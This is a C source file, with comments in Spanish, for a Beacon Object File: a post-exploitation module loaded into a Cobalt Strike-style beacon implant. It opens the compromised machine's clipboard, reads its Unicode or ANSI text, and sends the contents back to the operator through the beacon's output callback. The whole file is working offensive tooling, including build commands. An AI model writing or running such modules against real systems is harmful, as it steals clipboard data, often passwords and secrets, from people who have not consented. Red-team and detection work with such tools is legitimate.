/*
 * clipboard.c - Lee el contenido del portapapeles (CF_TEXT / CF_UNICODETEXT) BOF
 *
 * Correcciones vs. original:
 *   - OpenClipboard(NULL) en lugar de GetConsoleWindow() como owner
 *     (BOFs no tienen ventana de consola; pasar NULL es el uso correcto)
 *   - GlobalLock/GlobalUnlock para acceder al contenido del handle
 *   - Soporte para CF_UNICODETEXT si CF_TEXT no está disponible
 *   - CloseClipboard siempre se llama, incluso en error
 *
 * Compilar:
 *   x86_64-w64-mingw32-gcc -Wall -masm=intel -c clipboard.c -o _bin/clipboard.x64.o
 *   i686-w64-mingw32-gcc   -Wall -masm=intel -c clipboard.c -o _bin/clipboard.x86.o
 *
 * O simplemente: make
 */

#include <windows.h>
#include <winuser.h>
#include "beacon.h"

/* DFR declarations */
DECLSPEC_IMPORT WINUSERAPI BOOL   WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT WINUSERAPI BOOL   WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT WINUSERAPI HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT WINUSERAPI BOOL   WINAPI USER32$IsClipboardFormatAvailable(UINT);

DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$GlobalLock(HANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$GlobalUnlock(HANDLE);
DECLSPEC_IMPORT WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError(void);

DECLSPEC_IMPORT BOOL toWideChar(char *src, wchar_t *dst, int max);

void go(IN PCHAR Buffer, IN ULONG Length) {

    /* Abrir el portapapeles — NULL es el owner correcto desde un BOF
     * (no hay ventana de consola asociada al proceso beacon)        */
    if (!USER32$OpenClipboard(NULL)) {
        BeaconPrintf(CALLBACK_ERROR,
            "OpenClipboard failed: %lu\n", KERNEL32$GetLastError());
        return;
    }

    /* ---- Intentar CF_UNICODETEXT primero (más común en Windows modernos) ---- */
    if (USER32$IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE hData = USER32$GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t *pWide = (wchar_t *)KERNEL32$GlobalLock(hData);
            if (pWide) {
                /* Convertir a UTF-8/ANSI para BeaconPrintf usando el helper de beacon.h */
                BeaconPrintf(CALLBACK_OUTPUT, "[Clipboard / Unicode]\n%ws\n", pWide);
                KERNEL32$GlobalUnlock(hData);
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "GlobalLock failed: %lu\n", KERNEL32$GetLastError());
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "GetClipboardData(CF_UNICODETEXT) failed: %lu\n", KERNEL32$GetLastError());
        }
    }
    /* ---- Fallback a CF_TEXT ---- */
    else if (USER32$IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE hData = USER32$GetClipboardData(CF_TEXT);
        if (hData) {
            char *pText = (char *)KERNEL32$GlobalLock(hData);
            if (pText) {
                BeaconPrintf(CALLBACK_OUTPUT, "[Clipboard / ANSI]\n%s\n", pText);
                KERNEL32$GlobalUnlock(hData);
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "GlobalLock failed: %lu\n", KERNEL32$GetLastError());
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "GetClipboardData(CF_TEXT) failed: %lu\n", KERNEL32$GetLastError());
        }
    }
    /* ---- Portapapeles vacío o formato no soportado ---- */
    else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[Clipboard] Empty or non-text content (CF_TEXT / CF_UNICODETEXT not available)\n");
    }

    USER32$CloseClipboard();
}
